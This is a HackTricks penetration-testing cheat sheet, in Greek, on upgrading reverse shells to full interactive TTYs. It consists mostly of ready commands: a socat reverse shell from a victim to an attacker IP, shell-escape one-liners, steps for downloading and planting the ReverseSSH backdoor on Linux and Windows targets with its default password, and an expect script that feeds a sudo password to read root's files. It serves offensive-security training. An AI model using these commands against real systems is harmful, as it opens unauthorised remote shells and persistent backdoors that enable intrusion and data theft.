# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Σημειώστε ότι το shell που ορίζετε στη μεταβλητή `SHELL` **πρέπει** να είναι **καταχωρημένο μέσα** _**/etc/shells**_ ή `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Επίσης, σημειώστε ότι τα επόμενα αποσπάσματα λειτουργούν μόνο σε bash. Αν βρίσκεστε σε zsh, αλλάξτε σε bash πριν αποκτήσετε το shell εκτελώντας `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Μπορείτε να αποκτήσετε τον **αριθμό** των **γραμμών** και **στηλών** εκτελώντας **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Ένας βολικός τρόπος για **interactive shell access**, καθώς και **file transfers** και **port forwarding**, είναι η τοποθέτηση του στατικά συνδεδεμένου ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) στον στόχο.

Παρακάτω είναι ένα παράδειγμα για `x86` με upx-compressed binaries. Για άλλα binaries, ελέγξτε την [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Ετοιμαστείτε τοπικά για να πιάσετε το αίτημα port forwarding του ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Στόχος Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Στόχος Windows 10 (για παλαιότερες εκδόσεις, ελέγξτε το [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Αν το αίτημα προώθησης θύρας ReverseSSH ήταν επιτυχές, θα πρέπει τώρα να μπορείτε να συνδεθείτε με τον προεπιλεγμένο κωδικό πρόσβασης `letmeinbrudipls` στο πλαίσιο του χρήστη που εκτελεί το `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) αναβαθμίζει αυτόματα τα Linux reverse shells σε TTY, διαχειρίζεται το μέγεθος του τερματικού, καταγράφει τα πάντα και πολλά άλλα. Επίσης παρέχει υποστήριξη readline για Windows shells.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Αν για κάποιο λόγο δεν μπορείτε να αποκτήσετε πλήρες TTY, **μπορείτε ακόμα να αλληλεπιδράσετε με προγράμματα** που περιμένουν είσοδο από τον χρήστη. Στο παρακάτω παράδειγμα, ο κωδικός πρόσβασης περνάει στο `sudo` για να διαβάσει ένα αρχείο:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
